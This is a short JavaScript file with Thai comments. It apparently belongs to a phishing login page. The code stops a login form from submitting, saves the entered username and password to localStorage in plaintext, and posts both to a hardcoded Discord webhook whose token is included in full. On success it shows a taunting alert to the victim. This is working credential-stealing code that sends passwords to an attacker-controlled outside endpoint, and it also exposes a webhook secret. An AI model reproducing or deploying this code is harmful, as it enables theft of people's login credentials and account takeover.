// ตรวจสอบเมื่อฟอร์มถูกส่ง
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // ป้องกันไม่ให้ฟอร์มถูกส่งในทันที

    // รับข้อมูลที่กรอกจากฟอร์ม
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // บันทึกข้อมูลใน LocalStorage (เพียงเพื่อการทดสอบในเครื่อง)
    localStorage.setItem('username', username);
    localStorage.setItem('password', password);

    // ส่งข้อมูลไปยัง Webhook หรือเซิร์ฟเวอร์
    sendData(username, password);
});

function sendData(username, password) {
    const webhookUrl = "https://discord.com/api/webhooks/1312102853791187086/K3qnve_v8w_WFzwxJaBixKWPFKFm_2z_a4akH8jfN0HgFuuqFj8gfMz94AHBz2WL9DNa"; // เปลี่ยนเป็น Webhook ของคุณ

    // สร้างข้อมูลในรูปแบบ JSON
    const data = {
        content: `ข้อมูลสมัครสมาชิก:\nชื่อผู้ใช้: ${username}\nรหัสผ่าน: ${password}`
    };

    // ส่งข้อมูลไปยัง Webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            alert("คิดดีแล้วหรอจ๊ะะะะะะะะะะะะะะะ");
        } else {
            alert("เกิดข้อผิดพลาดในการส่งข้อมูล!");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("เกิดข้อผิดพลาดในการเชื่อมต่อ!");
    });
}
